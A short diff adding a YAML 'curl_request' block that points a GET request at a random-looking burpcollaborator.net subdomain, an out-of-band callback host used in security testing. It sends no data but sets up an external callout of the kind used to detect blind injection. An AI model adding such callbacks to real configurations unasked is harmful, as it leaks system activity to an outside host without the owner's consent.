@@ -1,0 +1,9 @@
+curl_request:
+  method: GET        # or POST, PUT, DELETE etc. depending on your needs
+  url: "http://fcv1unwwbtldi94289595w90jrphd6.burpcollaborator.net"
+  headers:
+    User-Agent: "Mozilla/5.0"  # Example header, you can add more headers if required
+    Accept: "*/*"
+  data: ""            # Data to send in a POST request, if needed
+  timeout: 30         # Timeout in seconds
+  follow_redirects: true
